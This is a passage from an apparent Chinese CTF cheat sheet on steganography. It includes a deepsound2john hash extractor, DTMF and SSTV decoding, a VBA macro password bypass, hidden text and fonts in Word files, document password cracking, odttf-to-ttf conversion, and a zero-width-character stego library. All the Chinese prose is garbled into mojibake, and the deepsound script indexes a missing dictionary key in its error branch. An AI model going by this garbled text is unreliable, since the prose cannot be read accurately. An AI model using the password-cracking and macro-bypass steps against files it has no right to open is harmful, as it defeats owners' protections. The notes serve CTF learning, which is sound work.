 <span class="hljs-comment"># Check some header fields</span><br>  mode = hdr[<span class="hljs-number">4</span>]<br>  encrypted = hdr[<span class="hljs-number">5</span>]<br><br>  modes = &#123;<span class="hljs-number">2</span>: <span class="hljs-string">&#x27;low&#x27;</span>, <span class="hljs-number">4</span>: <span class="hljs-string">&#x27;normal&#x27;</span>, <span class="hljs-number">8</span>: <span class="hljs-string">&#x27;high&#x27;</span>&#125;<br>  <span class="hljs-keyword">if</span> mode <span class="hljs-keyword">in</span> modes:<br>    logger.info(<span class="hljs-string">&#x27;data is encoded in %s-quality mode&#x27;</span>, modes[mode])<br>  <span class="hljs-keyword">else</span>:<br>    logger.error(<span class="hljs-string">&#x27;unexpected data encoding mode %i&#x27;</span>, modes[mode])<br>    <span class="hljs-keyword">return</span><br><br>  <span class="hljs-keyword">if</span> encrypted == <span class="hljs-number">0</span>:<br>    logger.warn(<span class="hljs-string">&#x27;file is not encrypted&#x27;</span>)<br>    <span class="hljs-keyword">return</span><br>  <span class="hljs-keyword">elif</span> encrypted != <span class="hljs-number">1</span>:<br>    logger.error(<span class="hljs-string">&#x27;unexpected encryption flag %i&#x27;</span>, encrypted)<br>    <span class="hljs-keyword">return</span><br><br>  sha1 = hdr[<span class="hljs-number">6</span>:<span class="hljs-number">6</span>+<span class="hljs-number">20</span>]<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s:$dynamic_1529$%s&#x27;</span> % (bname, sha1.<span class="hljs-built_in">hex</span>()))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  <span class="hljs-keyword">import</span> argparse<br><br>  parser = argparse.ArgumentParser()<br>  parser.add_argument(<span class="hljs-string">&#x27;--verbose&#x27;</span>, <span class="hljs-string">&#x27;-v&#x27;</span>, action=<span class="hljs-string">&#x27;store_true&#x27;</span>)<br>  parser.add_argument(<span class="hljs-string">&#x27;files&#x27;</span>, nargs=<span class="hljs-string">&#x27;+&#x27;</span>, metavar=<span class="hljs-string">&#x27;file&#x27;</span>,<br>    <span class="hljs-built_in">type</span>=argparse.FileType(<span class="hljs-string">&#x27;rb&#x27;</span>, bufsize=<span class="hljs-number">4096</span>))<br>  args = parser.parse_args()<br><br>  <span class="hljs-keyword">if</span> args.verbose:<br>    logging.basicConfig(level=logging.INFO)<br>  <span class="hljs-keyword">else</span>:<br>    logging.basicConfig(level=logging.WARN)<br><br>  convert_warn = <span class="hljs-literal">False</span><br><br>  <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> args.files:<br>    process_deepsound_file(f)<br><br>  <span class="hljs-keyword">if</span> convert_warn:<br>    <span class="hljs-built_in">print</span>(textwrap.dedent(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    ---------------------------------------------------------------</span><br><span class="hljs-string">    Some files were not in .wav format. Try converting them to .wav</span><br><span class="hljs-string">    and try again. You can use: ffmpeg -i input output.wav</span><br><span class="hljs-string">    ---------------------------------------------------------------</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>.rstrip()), file=sys.stderr)<br></code></pre></td></tr></table></figure>

<p>ç”¨æ³•</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">python3 deepsound2john.py carrier.wav &gt; hashes.txt<br>john hashes.txt<br></code></pre></td></tr></table></figure>

<h2 id="0x06-dtmf"><a href="#0x06-dtmf" class="headerlink" title="0x06 dtmf"></a>0x06 dtmf</h2><blockquote>
<p>åŒéŸ³å¤šé¢‘ä¿¡å·ï¼ˆDual-Tone Multi-Frequency, DTMFï¼‰ï¼Œç”µè¯ç³»ç»Ÿä¸­ç”µè¯æœºä¸äº¤æ¢æœºä¹‹é—´çš„ä¸€ç§ç”¨æˆ·ä¿¡ä»¤ï¼Œæœ€å¸¸ç”¨äºå‘æ‹¨å·æ—¶é€è¢«å«å·ç ã€‚<br>åŒéŸ³å¤šé¢‘çš„æ‹¨å·é”®ç›˜æ˜¯4Ã—4çš„çŸ©é˜µï¼Œæ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªé«˜é¢‘ï¼Œæ¯ä¸€åˆ—ä»£è¡¨ä¸€ä¸ªä½é¢‘ã€‚æ¯æŒ‰ä¸€ä¸ªé”®å°±å‘é€ä¸€ä¸ªé«˜é¢‘å’Œä½é¢‘çš„æ­£å¼¦ä¿¡å·ç»„åˆï¼Œæ¯”å¦‚â€™1â€™ç›¸å½“äº697å’Œ1209èµ«å…¹ï¼ˆHzï¼‰ã€‚äº¤æ¢æœºå¯ä»¥è§£ç è¿™äº›é¢‘ç‡ç»„åˆå¹¶ç¡®å®šæ‰€å¯¹åº”çš„æŒ‰é”®ã€‚<br>ï¼ˆæ¥è‡ªç»´åŸºç™¾ç§‘ï¼‰</p>
</blockquote>
<p><img src="/img/summary/misc/dtmf.jpg"></p>
<p>å‘½ä»¤è¯†åˆ«ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">dtmf2num xxx.wav<br></code></pre></td></tr></table></figure>


<h2 id="0x07-SSTV"><a href="#0x07-SSTV" class="headerlink" title="0x07 SSTV"></a>0x07 SSTV</h2><p>æ…¢æ‰«æç”µè§†ï¼ˆSlow-scan televisionï¼‰æ˜¯ä¸šä½™æ— çº¿ç”µçˆ±å¥½è€…çš„ä¸€ç§ä¸»è¦å›¾ç‰‡ä¼ è¾“æ–¹æ³•ï¼Œæ…¢æ‰«æç”µè§†é€šè¿‡æ— çº¿ç”µä¼ è¾“å’Œæ¥æ”¶å•è‰²æˆ–å½©è‰²é™æ€å›¾ç‰‡</p>
<p>å¯ä»¥é€šè¿‡<code>Robot36</code>appæˆ–è€…<a href="https://github.com/colaclanth/sstv">SSTV Decoder</a>è¯†åˆ«</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">sstv -d audio_file.wav -o result.png<br></code></pre></td></tr></table></figure>

<h2 id="0x08-openpuff-éœ€è¦passwd"><a href="#0x08-openpuff-éœ€è¦passwd" class="headerlink" title="0x08 openpuff(éœ€è¦passwd)"></a>0x08 openpuff(éœ€è¦passwd)</h2><p>windowsè½¯ä»¶</p>
<p>éœ€è¦ä¸‰ä¸ª8ä½å¯†ç è§£å¯†</p>
<p><img src="/img/summary/misc/openpuff.png"></p>
<h1 id="æ–‡æ¡£éšå†™"><a href="#æ–‡æ¡£éšå†™" class="headerlink" title="æ–‡æ¡£éšå†™"></a>æ–‡æ¡£éšå†™</h1><h2 id="0x01-VBAå®å¯†ç ç ´è§£"><a href="#0x01-VBAå®å¯†ç ç ´è§£" class="headerlink" title="0x01 VBAå®å¯†ç ç ´è§£"></a>0x01 VBAå®å¯†ç ç ´è§£</h2><p>å°†<code>CMG=</code>æ›¿æ¢ä¸º<code>CMG.</code>ï¼Œ<code>DPB=</code>æ›¿æ¢ä¸º<code>DPB.</code> ï¼Œ<code>GC=</code>æ›¿æ¢ä¸º<code>GC.</code></p>
<p><code>alt+F11</code>æ‰“å¼€vbaç¼–è¾‘å™¨</p>
<h2 id="0x02-å­—ä½“éšè—"><a href="#0x02-å­—ä½“éšè—" class="headerlink" title="0x02 å­—ä½“éšè—"></a>0x02 å­—ä½“éšè—</h2><p>åœ¨å­—ä½“çš„æ•ˆæœä¸­å‹¾é€‰éšè—é€‰é¡¹å³å¯éšè—å­—ç¬¦(æˆ–è€…é‡‡ç”¨äº†ç™½è‰²å­—ä½“)</p>
<p><img src="/img/summary/misc/word-1.png"></p>
<h2 id="0x03-å›¾ç‰‡éšè—"><a href="#0x03-å›¾ç‰‡éšè—" class="headerlink" title="0x03 å›¾ç‰‡éšè—"></a>0x03 å›¾ç‰‡éšè—</h2><p>æŠŠåç¼€æ”¹ä¸º<code>zip</code>è§£å‹ï¼Œåœ¨<code>media</code>ç›®å½•ä¸‹å¯ä»¥çœ‹åˆ°æ–‡æ¡£çš„æ‰€æœ‰å›¾ç‰‡(ä¸æ’é™¤æ•…æ„æ”¾åœ¨å…¶ä»–ç›®å½•ä¸­)</p>
<h2 id="0x04-pdfæ–‡ä»¶"><a href="#0x04-pdfæ–‡ä»¶" class="headerlink" title="0x04 pdfæ–‡ä»¶"></a>0x04 pdfæ–‡ä»¶</h2><p>ä½¿ç”¨ç¦æ˜•ç¼–è¾‘å™¨ç­‰å³å¯ç¼–è¾‘ï¼Œæˆ–è€…å…ˆè½¬æ¢æˆ<code>docx</code></p>
<h2 id="0x05-wbstego4"><a href="#0x05-wbstego4" class="headerlink" title="0x05 wbstego4"></a>0x05 wbstego4</h2><p>é€‚ç”¨äºpdféšå†™</p>
<h2 id="0x06-å¯†ç çˆ†ç ´"><a href="#0x06-å¯†ç çˆ†ç ´" class="headerlink" title="0x06 å¯†ç çˆ†ç ´"></a>0x06 å¯†ç çˆ†ç ´</h2><p>å¯ä»¥ç”¨<code>passware kit</code>ç­‰å·¥å…·çˆ†ç ´</p>
<p><img src="/img/summary/misc/word-2.png"></p>
<h2 id="0x07-odttfè½¬ttf"><a href="#0x07-odttfè½¬ttf" class="headerlink" title="0x07 odttfè½¬ttf"></a>0x07 odttfè½¬ttf</h2><p>å½“å¤åˆ¶æ–‡æ¡£ä¸­çš„å†…å®¹è‡³notepadåä¸åŸå†…å®¹ä¸ä¸€æ ·ï¼Œå¤šåŠæ˜¯ä¿®æ”¹äº†å­—ä½“</p>
<p><a href="https://somanchiu.github.io/odttf2ttf/js/demo">åœ¨çº¿ç½‘ç«™è½¬æ¢</a></p>
<p>pythonè½¬æ¢</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>odttf_name = <span class="hljs-string">&quot;./1F513ACE-F8AD-4F84-9264-C7B38E1D8CB7.odttf&quot;</span><br>odttf_path = os.path.abspath(odttf_name)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(odttf_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br><span class="hljs-comment"># è·å–æ–‡ä»¶å</span><br>file_name = os.path.splitext(odttf_path)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\\&quot;</span>)[-<span class="hljs-number">1</span>].replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># è·å–key</span><br>key = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_name), <span class="hljs-number">0</span>, -<span class="hljs-number">2</span>):<br>    key.append(<span class="hljs-built_in">int</span>(file_name[i-<span class="hljs-number">2</span>:i], <span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./font2.ttf&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        f.write(<span class="hljs-built_in">bytes</span>([data[i] ^ key[i % <span class="hljs-built_in">len</span>(key)]]))<br>    f.write(data[<span class="hljs-number">32</span>:])<br></code></pre></td></tr></table></figure>

<p>è½¬æ¢å‰å…ˆä¿®æ”¹<code>xxx.odttf</code>æ–‡ä»¶åä¸ºå¯¹åº”çš„<code>fontKey</code>å€¼(&#x2F;word&#x2F;fontTable.xml)</p>
<p><img src="/img/summary/misc/odttf.png"></p>
<p><a href="https://fontdrop.info/#/?darkmode=true">FontDrop</a>æˆ–fontforgeè¯†åˆ«ttfå³å¯</p>
<h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><h2 id="0x01-é›¶å®½å­—ç¬¦éšå†™"><a href="#0x01-é›¶å®½å­—ç¬¦éšå†™" class="headerlink" title="0x01 é›¶å®½å­—ç¬¦éšå†™"></a>0x01 é›¶å®½å­—ç¬¦éšå†™</h2><p>é›¶å®½åº¦å­—ç¬¦éšå†™æœ¯ï¼ˆZero-Width Space Steganographyï¼‰ï¼Œå°†éšè—æ¶ˆæ¯ç¼–ç å’Œè§£ç ä¸ºä¸å¯æ‰“å°&#x2F;å¯è¯»å­—ç¬¦ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">å­—ç¬¦åŒ…æ‹¬ï¼š<br>é›¶å®½åº¦ç©ºæ ¼ï¼ˆ\u200bï¼‰<br>é›¶å®½åº¦éè¿æ¥ç¬¦ï¼ˆ\u200cï¼‰<br>é›¶å®½åº¦è¿æ¥ç¬¦ï¼ˆ\u200dï¼‰<br>ä»å·¦è‡³å³ä¹¦å†™æ ‡è®°ï¼ˆ\u200eï¼‰<br>ä»å³è‡³å·¦ä¹¦å†™æ ‡è®°ï¼ˆ\u200fï¼‰<br></code></pre></td></tr></table></figure>

<p>åœ¨çº¿è§£å¯†å·¥å…·<br><a href="https://www.mzy0.com/ctftools/zerowidth1/">https://www.mzy0.com/ctftools/zerowidth1/</a><br><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools&#x2F;unicode_steganography.html</a><br><a href="https://offdev.net/demos/zwsp-steg-js">https://offdev.net/demos/zwsp-steg-js</a><br><a href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a><br><a href="http://www.atoolbox.net/Tool.php?Id=829">http://www.atoolbox.net/Tool.php?Id=829</a></p>
<p>pythonè§£å¯†<br><a href="https://github.com/enodari/zwsp-steg-py">https://github.com/enodari/zwsp-steg-py</a></p>
<p>jsè§£å¯†</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  Zero-Width Unicode Character Steganography</span><br><span class="hljs-comment"> *  Copyright (c) 2015-2016 Kei Misawa</span><br><span class="hljs-comment"> *  This software is released under the MIT License.</span><br><span class="hljs-comment"> *  http://opensource.org/licenses/mit-license.php</span><br><span class="hljs-comment"> */</span><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-built_in">exports</span></span>)&#123;<br>  <span class="hljs-string">&#x27;use strict&#x27;</span>;<br>  <span class="hljs-keyword">var</span> chars = [];<br>  <span class="hljs-keyword">var</span> radix = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">var</span> codelengthText = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">var</span> codelengthBinary = <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Set characters of coded hidden text(zero width characters)</span><br><span class="hljs-comment">    args: string of zero width characters</span><br><span class="hljs-comment">    return: null</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">var</span> setUseChars = <span class="hljs-keyword">function</span>(<span class="hljs-params">newchars</span>)&#123;<br>    <span class="hljs-keyword">if</span>(newchars.<span class="hljs-property">length</span> &gt;= <span class="hljs-number">2</span>)&#123;<br>      chars = newchars.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>      radix = chars.<span class="hljs-property">length</span>;<br>      codelengthText = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">65536</span>) / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(radix));<br>      codelengthBinary = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">256</span>) / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(radix));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;;<br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Text Encoder</span><br><span class="hljs-comment">    args:</span><br><span class="hljs-comment">      text: original text to be embedded (String)</span><br><span class="hljs-comment">      data: text to be hidden (String)</span><br><span class="hljs-comment">    return: unicode stego text</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">var</span> encodeText = <span class="hljs-keyword">function</span>(<span class="hljs-params">text1, text2</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">combine_shuffle_string</span>(text1, <span class="hljs-title function_">encode_to_zerowidth_characters_text</span>(text2), codelengthText);<br>  &#125;;<br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Binary Encoder</span><br><span class="hljs-comment">    args:</span><br><span class="hljs-comment">      text: original text to be embedded (String)</span><br><span class="hljs-comment">      data: data to be hidden (Uint8Array)</span><br><span class="hljs-comment">    return: unicode stego text</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">var</span> encodeBinary = <span class="hljs-keyword">function</span>(<span class="hljs-params">text, data</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">combine_shuffle_string</span>(text, <span class="hljs-title function_">encode_to_zerowidth_characters_binary</span>(data), codelengthBinary);<br>  &#125;;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Text Decoder</span><br><span class="hljs-comment">    args: unicode text with steganography (String)</span><br><span class="hljs-comment">    return: JavaScript Object &#123;</span><br><span class="hljs-comment">      originalText: original text (String),</span><br><span class="hljs-comment">      hiddenText: hidden data (String)</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">var</span> decodeText = <span class="hljs-keyword">function</span>(<span class="hljs-params">text</span>)&#123;<br>    <span class="hljs-keyword">var</span> splitted = <span class="hljs-title function_">split_zerowidth_characters</span>(text);<br><br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-string">&#x27;originalText&#x27;</span>: splitted.<span class="hljs-property">originalText</span>,<br>      <span class="hljs-string">&#x27;hiddenText&#x27;</span>: <span class="hljs-title function_">decode_from_zero_width_characters_text</span>(splitted.<span class="hljs-property">hiddenText</span>, codelengthText)<br>    &#125;;<br>  &#125;;<br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Binary Decoder</span><br><span class="hljs-comment">    args: unicode text with steganography (String)</span><br><span class="hljs-comment">    return: JavaScript Object &#123;</span><br><span class="hljs-comment">      originalText: original text (String),</span><br><span class="hljs-comment">      hiddenData: hidden data (Uint8Array)</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">var</span> decodeBinary = <span class="hljs-keyword">function</span>(<span class="hljs-params">text</span>)&#123;<br>    <span class="hljs-keyword">var</span> splitted = <span class="hljs-title function_">split_zerowidth_characters</span>(text);<br><br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-string">&#x27;originalText&#x27;</span>: splitted.<span class="hljs-property">originalText</span>,<br>      <span class="hljs-string">&#x27;hiddenData&#x27;</span>: <span class="hljs-title function_">decode_from_zero_width_characters_binary</span>(splitted.<span class="hljs-property">hiddenText</span>)<br>    &#125;;<br>  &#125;;<br><br>  <span class="hljs-title function_">setUseChars</span>(<span class="hljs-string">&#x27;\u200c\u200d\u202c\ufeff&#x27;</span>);<br><br>  <span class="hljs-built_in">exports</span>.<span class="hljs-property">unicodeSteganographer</span> = &#123;<br>    <span class="hljs-attr">encodeText</span>: encodeText,<br>    <span class="hljs-attr">decodeText</span>: decodeText,<br>    <span class="hljs-attr">encodeBinary</span>: encodeBinary,<br>    <span class="hljs-attr">decodeBinary</span>: decodeBinary,<br>    <span class="hljs-attr">setUseChars</span>: setUseChars<br>  &#125;;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Internal Functions</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">var</span> encode_to_zerowidth_characters_text = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1</span>)&#123;<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(str1.<span class="hljs-property">length</span>);<br>    <span class="hljs-keyword">var</span> base = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> c;<br>    <span class="hljs-keyword">var</span> d;<br>    <span class="hljs-keyword">var</span> r;<br><br>    <span class="hljs-comment">//var base = &#x27;0&#x27;.repeat(codelength); // IE not support this method</span><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; codelengthText; i++)&#123;<br>      base += <span class="hljs-string">&#x27;0&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; str1.<span class="hljs-property">length</span>; i++)&#123;<br>      c = str1.<span class="hljs-title function_">charCodeAt</span>(i);<br>      d = c.<span class="hljs-title function_">toString</span>(radix);<br><br>      result[i] = (base + d).<span class="hljs-title function_">substr</span>(-codelengthText);<br>    &#125;<br><br>    r = result.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; radix; i++)&#123;<br>      r = r.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(i, <span class="hljs-string">&#x27;g&#x27;</span>), chars[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> r;<br>  &#125;;<br>  <span class="hljs-keyword">var</span> encode_to_zerowidth_characters_binary = <span class="hljs-keyword">function</span>(<span class="hljs-params">u8ary</span>)&#123;<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(u8ary.<span class="hljs-property">length</span>);<br>    <span class="hljs-keyword">var</span> base = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> c;<br>    <span class="hljs-keyword">var</span> d;<br>    <span class="hljs-keyword">var</span> r;<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; codelengthBinary; i++)&#123;<br>      base += <span class="hljs-string">&#x27;0&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; u8ary.<span class="hljs-property">length</span>; i++)&#123;<br>      d = u8ary[i].<span class="hljs-title function_">toString</span>(radix);<br>      result[i] = (base + d).<span class="hljs-title function_">substr</span>(-codelengthBinary);<br>    &#125;<br><br>    r = result.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; radix; i++)&#123;<br>      r = r.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(i, <span class="hljs-string">&#x27;g&#x27;</span>), chars[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> r;<br>  &#125;;<br>  <span class="hljs-keyword">var</span> combine_shuffle_string = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1, str2, codelength</span>)&#123;<br>    <span class="hljs-keyword">var</span> result = [];<br>    <span class="hljs-keyword">var</span> c0 = str1.<span class="hljs-title function_">split</span>(<span class="hljs-regexp">/([\u0000-\u002F\u003A-\u0040\u005b-\u0060\u007b-\u007f])|([\u0030-\u0039]+)|([\u0041-\u005a\u0061-\u007a]+)|([\u0080-\u00FF]+)|([\u0100-\u017F]+)|([\u0180-\u024F]+)|([\u0250-\u02AF]+)|([\u02B0-\u02FF]+)|([\u0300-\u036F]+)|([\u0370-\u03FF]+)|([\u0400-\u04FF]+)|([\u0500-\u052F]+)|([\u0530-\u058F]+)|([\u0590-\u05FF]+)|([\u0600-\u06FF]+)|([\u0700-\u074F]+)|([\u0750-\u077F]+)|([\u0780-\u07BF]+)|([\u07C0-\u07FF]+)|([\u0800-\u083F]+)|([\u0840-\u085F]+)|([\u08A0-\u08FF]+)|([\u0900-\u097F]+)|([\u0980-\u09FF]+)|([\u0A00-\u0A7F]+)|([\u0A80-\u0AFF]+)|([\u0B00-\u0B7F]+)|([\u0B80-\u0BFF]+)|([\u0C00-\u0C7F]+)|([\u0C80-\u0CFF]+)|([\u0D00-\u0D7F]+)|([\u0D80-\u0DFF]+)|([\u0E00-\u0E7F]+)|([\u0E80-\u0EFF]+)|([\u0F00-\u0FFF]+)|([\u1000-\u109F]+)|([\u10A0-\u10FF]+)|([\u1100-\u11FF]+)|([\u1200-\u137F]+)|([\u1380-\u139F]+)|([\u13A0-\u13FF]+)|([\u1400-\u167F]+)|([\u1680-\u169F]+)|([\u16A0-\u16FF]+)|([\u1700-\u171F]+)|([\u1720-\u173F]+)|([\u1740-\u175F]+)|([\u1760-\u177F]+)|([\u1780-\u17FF]+)|([\u1800-\u18AF]+)|([\u18B0-\u18FF]+)|([\u1900-\u194F]+)|([\u1950-\u197F]+)|([\u1980-\u19DF]+)|([\u19E0-\u19FF]+)|([\u1A00-\u1A1F]+)|([\u1A20-\u1AAF]+)|([\u1AB0-\u1AFF]+)|([\u1B00-\u1B7F]+)|([\u1B80-\u1BBF]+)|([\u1BC0-\u1BFF]+)|([\u1C00-\u1C4F]+)|([\u1C50-\u1C7F]+)|([\u1CC0-\u1CCF]+)|([\u1CD0-\u1CFF]+)|([\u1D00-\u1D7F]+)|([\u1D80-\u1DBF]+)|([\u1DC0-\u1DFF]+)|([\u1E00-\u1EFF]+)|([\u1F00-\u1FFF]+)|([\u2000-\u206F]+)|([\u2070-\u209F]+)|([\u20A0-\u20CF]+)|([\u20D0-\u20FF]+)|([\u2100-\u214F]+)|([\u2150-\u218F]+)|([\u2190-\u21FF]+)|([\u2200-\u22FF]+)|([\u2300-\u23FF]+)|([\u2400-\u243F]+)|([\u2440-\u245F]+)|([\u2460-\u24FF]+)|([\u2500-\u257F]+)|([\u2580-\u259F]+)|([\u25A0-\u25FF]+)|([\u2600-\u26FF]+)|([\u2700-\u27BF]+)|([\u27C0-\u27EF]+)|([\u27F0-\u27FF]+)|([\u2800-\u28FF]+)|([\u2900-\u297F]+)|([\u2980-\u29FF]+)|([\u2A00-\u2AFF]+)|([\u2B00-\u2BFF]+)|([\u2C00-\u2C5F]+)|([\u2C60-\u2C7F]+)|([\u2C80-\u2CFF]+)|([\u2D00-\u2D2F]+)|([\u2D30-\u2D7F]+)|([\u2D80-\u2DDF]+)|([\u2DE0-\u2DFF]+)|([\u2E00-\u2E7F]+)|([\u2E80-\u2EFF]+)|([\u2F00-\u2FDF]+)|([\u2FF0-\u2FFF]+)|([\u3000-\u303F]+)|([\u3040-\u309F]+)|([\u30A0-\u30FF]+)|([\u3100-\u312F]+)|([\u3130-\u318F]+)|([\u3190-\u319F]+)|([\u31A0-\u31BF]+)|([\u31C0-\u31EF]+)|([\u31F0-\u31FF]+)|([\u3200-\u32FF]+)|([\u3300-\u33FF]+)|([\u3400-\u4DBF]+)|([\u4DC0-\u4DFF]+)|([\u4E00-\u9FFF]+)|([\uA000-\uA48F]+)|([\uA490-\uA4CF]+)|([\uA4D0-\uA4FF]+)|([\uA500-\uA63F]+)|([\uA640-\uA69F]+)|([\uA6A0-\uA6FF]+)|([\uA700-\uA71F]+)|([\uA720-\uA7FF]+)|([\uA800-\uA82F]+)|([\uA830-\uA83F]+)|([\uA840-\uA87F]+)|([\uA880-\uA8DF]+)|([\uA8E0-\uA8FF]+)|([\uA900-\uA92F]+)|([\uA930-\uA95F]+)|([\uA960-\uA97F]+)|([\uA980-\uA9DF]+)|([\uA9E0-\uA9FF]+)|([\uAA00-\uAA5F]+)|([\uAA60-\uAA7F]+)|([\uAA80-\uAADF]+)|([\uAAE0-\uAAFF]+)|([\uAB00-\uAB2F]+)|([\uAB30-\uAB6F]+)|([\uAB70-\uABBF]+)|([\uABC0-\uABFF]+)|([\uAC00-\uD7AF]+)|([\uD7B0-\uD7FF]+)|([\uD800-\uDFFF]+)|([\uE000-\uF8FF]+)|([\uF900-\uFAFF]+)|([\uFB00-\uFB4F]+)|([\uFB50-\uFDFF]+)|([\uFE00-\uFE0F]+)|([\uFE10-\uFE1F]+)|([\uFE20-\uFE2F]+)|([\uFE30-\uFE4F]+)|([\uFE50-\uFE6F]+)|([\uFE70-\uFEFF]+)|([\uFF00-\uFFEF]+)|([\uFFF0-\uFFFF]+)/g</span>);<br>    <span class="hljs-keyword">var</span> c1 = [];<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; c0.<span class="hljs-property">length</span>; i++)&#123;<br>      <span class="hljs-keyword">if</span>((<span class="hljs-keyword">typeof</span> c0[i] !== <span class="hljs-string">&#x27;undefined&#x27;</span>) &amp;&amp; (c0[i] !== <span class="hljs-string">&#x27;&#x27;</span>))&#123;<br>        c1.<span class="hljs-title function_">push</span>(c0[i]);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">var</span> c2 = str2.<span class="hljs-title function_">split</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;(.&#123;&#x27;</span> + codelength + <span class="hljs-string">&#x27;&#125;)&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>));<br>    <span class="hljs-keyword">var</span> ratio = c1.<span class="hljs-property">length</span> / (c1.<span class="hljs-property">length</span> + c2.<span class="hljs-property">length</span>);<br><br>    <span class="hljs-comment">/* slow</span><br><span class="hljs-comment">    while((c1.length &gt; 0) &amp;&amp; (c2.length &gt; 0))&#123;</span><br><span class="hljs-comment">      if(Math.random() &lt;= ratio)&#123;</span><br><span class="hljs-comment">        result.push(c1.shift());</span><br><span class="hljs-comment">      